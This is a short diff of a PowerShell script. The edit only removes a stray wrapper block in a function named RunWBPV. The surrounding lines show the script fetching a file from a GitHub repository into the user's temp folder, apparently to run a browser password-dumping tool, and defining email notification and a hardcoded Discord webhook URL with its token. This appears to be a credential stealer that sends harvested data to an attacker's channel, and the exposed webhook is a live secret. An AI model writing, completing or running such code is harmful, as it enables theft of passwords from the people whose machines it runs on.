@@ -79,7 +79,6 @@ function Send-EmailNotification {
     }
 }
 function RunWBPV {
-    1 {
         # Run WBPV 
         $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
         $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
@@ -182,7 +181,6 @@ function RunWBPV {
             Write-Host "Operation $step / $totalSteps is done."
             SetEmailSentFalse
         }
-    }
 }
 
 $webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
